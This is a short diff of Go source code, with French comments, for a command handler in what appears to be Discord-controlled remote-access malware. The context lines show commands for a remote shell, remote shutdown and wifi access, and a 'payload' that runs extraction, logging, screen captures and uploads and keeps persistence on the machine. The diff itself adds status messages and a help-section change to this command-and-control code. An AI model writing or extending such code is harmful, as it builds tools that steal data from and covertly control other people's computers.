@@ -303,7 +303,7 @@ func c2Execute(command string) {
 
 	switch name {
 	case "help", "aide":
-		discordReply(c2Help())
+		discordReply(c2HelpSection(args))
 
 	case "shell", "cmd", "c":
 		if args == "" {
@@ -539,6 +539,7 @@ func c2Execute(command string) {
 		}
 		// Le poste va s éteindre : on le signale dans infos avant de couper.
 		botSendText(infosChannel(), fmt.Sprintf("PC éteint à %s (%s dans %d s).", time.Now().Format("02/01 15:04"), map[bool]string{true: "redémarrage", false: "arrêt"}[restart], timeout))
+		postInfosStatus(false)
 		discordReply(shutdownPC(restart, timeout))
 
 	case "wifi":
@@ -659,6 +660,7 @@ func c2Execute(command string) {
 		cfg.Enabled = false
 		stopped.Store(true)
 		postStatus(false)
+		postInfosStatus(false)
 		discordReply("payload arrêté : extraction, journal, captures et envois " +
 			"s'arrêtent. La persistance reste en place — tape `!persist off` " +
 			"ou `!delete confirm` pour tout retirer. Relance l'application pour redémarrer.")
